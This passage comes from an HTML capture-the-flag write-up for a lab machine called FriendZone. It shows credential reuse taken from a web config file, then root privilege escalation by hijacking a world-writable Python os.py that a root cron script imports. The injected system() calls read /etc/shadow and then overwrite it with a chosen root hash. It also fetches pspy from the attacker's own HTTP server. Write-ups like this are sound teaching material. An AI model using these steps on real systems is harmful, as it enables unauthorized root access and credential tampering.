+        <h2><strong>8) www-data to friend</strong></h2><br>
+        There were a lot of elements to the website in this challenge, so I decided to go back and look at it once I had a shell.<br>
+        Turns out there's some valuable credentials in there.<br>
+        <br>
+            <div class="codebox">
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span><br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                ...<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>mysql_data.conf<br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">development</span>&nbsp;process&nbsp;this&nbsp;is&nbsp;the&nbsp;mysql&nbsp;creds&nbsp;for&nbsp;user&nbsp;friend<br>
+                <br>
+                db_user=friend<br>
+                <br>
+                db_pass=Agpyu12!0.213$<br>
+                <br>
+                db_name=FZ
+            </div>
+        </div><br>
+        <br>
+        I remembered SSH was running, so decided to try ssh as friend for a better shell.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;friend@10.10.10.123<br>
+                friend@10.10.10.123s&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Agpyu12<span style="color:#ff9d00;font-weight:700">!</span>0.213$<br>
+                Welcome&nbsp;to&nbsp;Ubuntu&nbsp;18.04.1&nbsp;LTS&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GNU<span style="color:#ff9d00;font-weight:700">/</span>Linux&nbsp;4.15.0-36-generic&nbsp;x86_64<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                &nbsp;*&nbsp;Documentation<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>help.ubuntu.com<br>
+                &nbsp;*&nbsp;Management<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>landscape.canonical.com<br>
+                &nbsp;*&nbsp;Support<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>ubuntu.com<span style="color:#ff9d00;font-weight:700">/</span>advantage<br>
+                <br>
+                You&nbsp;have&nbsp;mail.<br>
+                Last&nbsp;<span style="color:#ff9d00;font-weight:700">login:</span>&nbsp;Thu&nbsp;Jan&nbsp;24&nbsp;01<span style="color:#ff9d00;font-weight:700">:</span>20<span style="color:#ff9d00;font-weight:700">:</span>15&nbsp;2019&nbsp;from&nbsp;10.10.14.3<br>
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        And it works :)<br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>9) python privesc</strong></h2><br>
+        I don't know how you can figure out how to root this machine without using pspy, unless you're running on serious guesswork. It's definitely possible to guess, but it would be frustrating.<br>
+        <br>
+        Have a look for world-writeable folders and files<br>
+            <div class="codebox">
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-xdev&nbsp;-type&nbsp;d&nbsp;<span style="color:#333333;font-weight:400">\(</span>&nbsp;-perm&nbsp;-0002&nbsp;-a&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;-perm&nbsp;-1000&nbsp;<span style="color:#333333;font-weight:400">\)</span>&nbsp;-print&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>sambafiles<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>Development<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>python2.7<br>
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-xdev&nbsp;-type&nbsp;f&nbsp;<span style="color:#333333;font-weight:400">\(</span>&nbsp;-perm&nbsp;-0002&nbsp;-a&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;-perm&nbsp;-1000&nbsp;<span style="color:#333333;font-weight:400">\)</span>&nbsp;-print&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>Development<span style="color:#ff9d00;font-weight:700">/</span>myshell.php<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>Development<span style="color:#ff9d00;font-weight:700">/</span>rs.php<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>python2.7<span style="color:#ff9d00;font-weight:700">/</span>os.py
+            </div>
+        </div><br>
+        <br>
+        <code>os.py</code> is an odd result, users shouldn't be able to write to python libraries.<br>
+        With the lack of current information we have, it's faily unclear what we can do with os.py at the moment. The hope is that a root python script somewhere, one that we can execute, is importing os.py.<br>
+        <br>
+        This where <code>pspy</code> becomes useful. It's used monitors linux processes.<br>
+        <br>
+        <code>wget</code> it to your attacking machine and serve it.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>DominicBreuker<span style="color:#ff9d00;font-weight:700">/</span>pspy<span style="color:#ff9d00;font-weight:700">/</span>releases<span style="color:#ff9d00;font-weight:700">/</span>download<span style="color:#ff9d00;font-weight:700">/</span>v1.0.0<span style="color:#ff9d00;font-weight:700">/</span>pspy32s<br>
+                ...<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Download it onto your target machine and run it.<br>
+            <div class="codebox">
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.13.120<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>pspy32s<br>
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;+x&nbsp;pspy32s<br>
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>pspy32s<br>
+            </div>
+        </div><br>
+        <br>
+        After watching <code>pspy</code> for a bit, you'll see this:<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span>&nbsp;-c&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>server_admin<span style="color:#ff9d00;font-weight:700">/</span>reporter.py&nbsp;
+            </div>
+        </div><br>
+        <br>
+        And watching a bit longer, you'll see that this python script gets executed every few minutes<br>
+        <br>
+        Go have a look at the script.<br>
+            <div class="codebox">
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>server_admin<span style="color:#ff9d00;font-weight:700">/</span><br>
+                total&nbsp;12K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;2&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jan&nbsp;24&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>57&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;3&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Oct&nbsp;&nbsp;6&nbsp;&nbsp;2018&nbsp;..<br>
+                -rwxr--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;424&nbsp;Jan&nbsp;16&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;reporter.py
+            </div>
+        </div><br>
+        <br>
+        It's owned by root, but we can read it.<br>
+            <div class="codebox">
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>server_admin<span style="color:#ff9d00;font-weight:700">/</span>reporter.py&nbsp;<br>
+                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
+                <br>
+                import&nbsp;os<br>
+                <br>
+                to_address&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"admin1@friendzone.com"</span><br>
+                from_address&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"admin2@friendzone.com"</span><br>
+                <br>
+                print&nbsp;<span style="color:#3ad900;font-weight:400">"[+]&nbsp;Trying&nbsp;to&nbsp;send&nbsp;email&nbsp;to&nbsp;%s"</span>%to_address<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#command&nbsp;=&nbsp;'''&nbsp;mailsend&nbsp;-to&nbsp;admin2@friendzone.com&nbsp;-from&nbsp;admin1@friendzone.com&nbsp;-ssl&nbsp;-port&nbsp;465&nbsp;-auth&nbsp;-smtp&nbsp;smtp.gmail.co-sub&nbsp;scheduled&nbsp;results&nbsp;email&nbsp;+cc&nbsp;+bc&nbsp;-v&nbsp;-user&nbsp;you&nbsp;-pass&nbsp;"PAPAP"'''</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#os.system(command)</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;I&nbsp;need&nbsp;to&nbsp;edit&nbsp;the&nbsp;script&nbsp;later</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Sam&nbsp;~&nbsp;python&nbsp;developer</span><br>
+            </div>
+        </div><br>
+        <br>
+        Because of all the comments, this script doesn't actually do anything except import os, declare 2 variables and print a line.<br>
+        <br>
+        HOWEVER, <code>import os</code> is all we need.<br>
+        <br>
+        When libraries are imported in python, they get executed.<br>
+        If we modify <code>os.py</code>, we should be able to get root code execution because the <code>reporter.py</code> runs as root <em>and</em> imports the <code>os</code> library.<br>
+        <br>
+        We know that reporter.py runs as root because it's owned by root and because only root has execute permissions on the script.<br>
+        <code>-rwxr--r-- 1 root root 424 Jan 16 22:03 reporter.py</code><br>
+        <br>
+        First, test whether we really do we have code execution as root.<br>
+        At the end of os.py, just after the <code>except NameError</code> line, add your code.<br>
+        The <code>system</code> function is defined earlier in the os.py library and is used to execute system commands.<br>
+            <div class="codebox">
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>tests<br>
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;nano&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>python2.7<span style="color:#ff9d00;font-weight:700">/</span>os.py<br>
+                ...<br>
+                except&nbsp;NameError<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;statvfs_result&nbsp;may&nbsp;not&nbsp;exist</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;pass<br>
+                <br>
+                system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"touch&nbsp;/tmp/tests/touchtest.txt"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>tests<span style="color:#ff9d00;font-weight:700">/</span><br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;May&nbsp;21&nbsp;13<span style="color:#ff9d00;font-weight:700">:</span>34&nbsp;touchtest.txt
+            </div>
+        </div><br>
+        <br>
+        Nice! We can execute commands as root.<br>
+        It should be pretty trivial to get root at this point considering we can code execution as root, but of the many things I tried i couldn't get any of them to work: reverse shells, suid binaries, adding friend to sudo group etc.<br>
+        I have no idea why.<br>
+        <br>
+        The only thing that ended up working was modifying /etc/shadow with a new password.<br>
+        Reading and copying files worked fine, that's all you need to be able to modify /etc/shadow.<br>
+        <br>
+        Get a copy of <code>/etc/shadow</code> to edit.<br>
+            <div class="codebox">
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;nano&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>python2.7<span style="color:#ff9d00;font-weight:700">/</span>os.py<br>
+                ...<br>
+                except&nbsp;NameError<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;statvfs_result&nbsp;may&nbsp;not&nbsp;exist</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;pass<br>
+                <br>
+                system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"cp&nbsp;/etc/shadow&nbsp;/tmp/tests/shadow.orig"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"touch&nbsp;/tmp/tests/shadowGET.txt"</span><span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        Wait for <code>reporter.py</code> to run and you should see a copy of shadow.<br>
+            <div class="codebox">
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>tests<span style="color:#ff9d00;font-weight:700">/</span><br>
+                total&nbsp;1128<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;May&nbsp;21&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>48&nbsp;shadowGET.txt<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;994&nbsp;May&nbsp;21&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>48&nbsp;shadow.orig<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;May&nbsp;21&nbsp;13<span style="color:#ff9d00;font-weight:700">:</span>34&nbsp;touchtest.txt
+            </div>
+        </div><br>
+        <br>
+        Make a a new root password on your attacking machine, follwing the same configuration as found in /etc/passwd (sha-512, 8 character salt)<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;mkpasswd&nbsp;-m&nbsp;sha-512&nbsp;-S&nbsp;saltsalt&nbsp;-s<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;redkeydoor<br>
+                <span style="color:#7f0044;font-weight:400">$6$saltsalt$12qfetqtkQFyOVBYUBQrvu07K7uDSZlzHhickgT</span>.hMcbaUprRpT9nXVEe6C5fmNNVv4M0loc<span style="color:#ff9d00;font-weight:700">/</span>cS.WmgMe3IZh1
+            </div>
+        </div><br>
+        <br>
+        Make a copy of shadow.orig and copy/paste the newly generated sha-512 hash into it, replacing root's hash.<br>
+        <code>friend@FriendZone:/tmp/tests$ nano shadow.orig</code><br>
+        <br>
+        The root entry in my modified /etc/shadow looked like this (the rest of the file was untouched):<br>
+            <div class="codebox">
+                root:$6$saltsalt$12qfetqtkQFyOVBYUBQrvu07K7uDSZlzHhickgT.hMcbaUprRpT9nXVEe6C5fmNNVv4M0loc/cS.WmgMe3IZh1:17813:0:99999:7:::
+            </div>
+        </div><br>
+        <br>
+        Save your modified file as <code>shadow.new</code><br>
+        Modify os.py to copy over our new /etc/shadow<br>
+            <div class="codebox">
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;nano&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>python2.7<span style="color:#ff9d00;font-weight:700">/</span>os.py<br>
+                ...<br>
+                except&nbsp;NameError<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;statvfs_result&nbsp;may&nbsp;not&nbsp;exist</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;pass<br>
+                <br>
+                system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"cp&nbsp;/tmp/tests/shadow.new&nbsp;/etc/shadow"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"touch&nbsp;/tmp/tests/shadowTHROW.txt"</span><span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        I'm using shadowTHROW.txt as a notification to tell me when /etc/shadow has been overwritten.<br>
+        Watch for shadowTHROW.txt in /tmp/tests/, and once it's there /etc/shadow will have been overwritten.<br>
+            <div class="codebox">
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>tests<span style="color:#ff9d00;font-weight:700">/</span><br>
+                total&nbsp;1128<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;May&nbsp;21&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>48&nbsp;shadowGET.txt<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;May&nbsp;21&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>53&nbsp;shadowTHROW.txt<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;994&nbsp;May&nbsp;21&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>48&nbsp;shadow.orig<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;May&nbsp;21&nbsp;13<span style="color:#ff9d00;font-weight:700">:</span>34&nbsp;touchtest.txt
+            </div>
+        </div><br>
+        <br>
+        Finally, <code>su</code> to root using the password we created.<br>
+            <div class="codebox">
+                friend@FriendZone<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>tests$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;root<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;redkeydoor<br>
+                root@FriendZone<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>tests#&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span><br>
+                root@FriendZone<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>tests#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<br>
+                root@FriendZone<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                certs&nbsp;&nbsp;root.txt<br>
+                root@FriendZone<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;root.txt<br>
+                b0e6...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
